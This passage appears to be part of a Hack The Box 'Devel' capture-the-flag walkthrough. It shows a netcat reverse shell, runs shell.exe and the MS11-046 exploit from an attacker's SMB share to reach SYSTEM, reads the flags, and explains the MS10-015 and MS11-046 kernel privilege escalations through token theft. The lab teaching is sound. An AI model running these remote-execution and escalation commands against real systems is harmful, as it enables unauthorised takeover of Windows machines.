connect to [10.10.14.39] from (UNKNOWN) [10.129.36.65] 49197

PS C:\windows\system32\inetsrv> \\10.10.14.39\kali\shell.exe


┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel]
└─$ nc -lvnp 4443                                                                                 
listening on [any] 4443 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.36.65] 49199
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\windows\system32\inetsrv>
```


From this session we can remotely call and execute `MS11-046.exe` using our SMB server. This time the exploit works and we land as `nt authority\system`, giving us complete control over the machine.
```Shell
C:\windows\system32\inetsrv>\\10.10.14.39\kali\MS11-046.exe
\\10.10.14.39\kali\MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>hostname
hostname
devel
```

As we have now successfully escalated our privileges we can attempt to locate the flags on the box in the next section, completing the machine.

---
### Obtaining the Flags

We now have the ability to fetch both the `root.txt` and `user.txt` flags on the machine. We will use our trusty `dir` command from the last walkthrough to locate them, then use `type` to read their contents.

```Shell
c:\Windows\System32>dir C:\ /s /b /a:-d 2>nul | find "root.txt"
dir C:\ /s /b /a:-d 2>nul | find "root.txt"
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\root.txt (2).lnk
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\root.txt.lnk
C:\Users\Administrator\Desktop\root.txt

c:\Windows\System32>dir C:\ /s /b /a:-d 2>nul | find "user.txt"
dir C:\ /s /b /a:-d 2>nul | find "user.txt"
C:\Users\babis\AppData\Roaming\Microsoft\Windows\Recent\user.txt.lnk
C:\Users\babis\Desktop\user.txt


c:\Windows\System32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
[root flag redacted]

c:\Windows\System32>type C:\Users\babis\Desktop\user.txt
type C:\Users\babis\Desktop\user.txt
[user flag redacted]
```

---

### Beyond Root

Ending things here would leave the most interesting part unexamined — at this point we have fired exploits without fully understanding why and how they work. In this section we analyse the two privilege escalation exploits and compare them at an operational level.

**MS10-015 (KiTrap0D) — CVE-2010-0233**

MS10-015 is the first local privilege escalation vulnerability we used — a Windows kernel exploit. It stems from improper handling of General Protection Fault (#GP) exceptions in the Windows kernel's Virtual DOS Machine (VDM) subsystem. The name **KiTrap0D** comes from the kernel's internal naming convention: `Ki` (Kernel Interrupt) + `Trap` + `0D` (hex 13, the exception vector for a #GP fault). Under specific circumstances, an attacker can trigger this exception handler in a way that corrupts kernel memory.

Because the Windows kernel executes with the highest privilege level (Ring 0), successfully exploiting this corruption allows an attacker to execute arbitrary code in kernel mode and elevate their process to NT AUTHORITY\SYSTEM.

At a high level, the exploit performs the following steps:

1. A low-privileged process opens a VDM (Virtual DOS Machine) context and triggers a General Protection Fault (#GP) exception.
2. The exception is dispatched to the Windows kernel function `KiTrap0D`.
3. Due to a flaw in the exception handling logic, the attacker can influence kernel memory during exception processing.
4. The exploit executes code in kernel mode.
5. The exploit replaces the current process's security token with the SYSTEM process token.
6. When execution returns to user mode, the process now possesses SYSTEM privileges.

**Why does the exploit copy the SYSTEM token?**

- Every Windows process has an access token that defines the identity and privileges under which it runs.
- Rather than creating new privileges, the exploit simply copies the access token belonging to the SYSTEM process (PID 4) and assigns it to the attacker's process.
- Windows now believes the process *is* SYSTEM.
- This technique is common among Windows local privilege escalation exploits.


**MS11-046 (AFD.sys) — CVE-2011-1249**

MS11-046 affects `AFD.sys`, the Ancillary Function Driver, which forms part of the Windows networking subsystem and provides the kernel interface used by Winsock. A flaw in the driver's handling of certain I/O requests allows a local attacker to overwrite kernel memory. Because `AFD.sys` runs in kernel mode, this memory corruption can be leveraged to execute arbitrary code with kernel privileges.

The exploit generally follows these stages:

1. Open a handle to the vulnerable AFD.sys driver.
2. Craft a specially formed I/O request.
3. Trigger the vulnerable code path within the driver.
4. Overwrite a function pointer in kernel memory.
5. Redirect execution to attacker-controlled shellcode.
6. Execute code in Ring 0.
7. Replace the current process token with the SYSTEM token.
8. Return to user mode as NT AUTHORITY\SYSTEM.


**Common Pattern Between Both**

Although these exploits target completely different vulnerabilities, they both ultimately achieve the same goal:

| MS10-015                          | MS11-046                     |
| --------------------------------- | ---------------------------- |
| Vulnerable kernel exception handler | Vulnerable network driver  |
| Kernel memory corruption          | Kernel memory corruption     |
| Execute attacker code in Ring 0   | Execute attacker code in Ring 0 |
| Steal SYSTEM token                | Steal SYSTEM token           |
| Return to user mode as SYSTEM     | Return to user mode as SYSTEM |

This illustrates an important concept in Windows privilege escalation: the vulnerability itself is often just the entry point. Once kernel code execution is obtained, many exploits use the same technique of replacing the current process's access token with that of the SYSTEM process, instantly granting the highest level of privilege.

**Conclusion**

While these exploits appear very different on the surface, they share a common objective: achieving code execution within the Windows kernel. Once running in kernel mode, the exploit can manipulate operating system data structures that are normally protected from user applications. In both cases this culminates in replacing the current process's access token with the SYSTEM token, demonstrating that many Windows privilege escalation exploits rely on the same post-exploitation technique despite exploiting entirely different vulnerabilities.

![Side-by-side comparison diagram of MS10-015 and MS11-046 exploitation chains]({{ '/assets/img/htb-devel/Devel_DTE_Compare.png' | relative_url }})
